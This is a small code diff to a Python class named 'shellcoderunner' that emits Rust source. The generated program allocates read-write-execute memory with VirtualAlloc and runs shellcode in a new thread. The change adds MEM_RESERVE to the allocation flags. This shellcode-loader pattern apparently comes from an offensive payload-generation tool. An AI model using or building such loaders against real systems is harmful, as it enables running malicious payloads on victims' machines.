@@ -5,7 +5,7 @@ class shellcoderunner:
                 'use windows_sys::Win32::System::Memory::VirtualAlloc;', 
                 'use windows_sys::Win32::System::Threading::CreateThread;', 
                 'use windows_sys::Win32::System::Threading::WaitForSingleObject;', 
-                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};',
+                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};',
                 'use std::ptr;'
         ]
 
@@ -26,7 +26,7 @@ fn main() {{
         let func_addr = VirtualAlloc(
             ptr::null_mut(),
             shellcode.len(),
-            MEM_COMMIT,
+            MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE, 
         );
 		
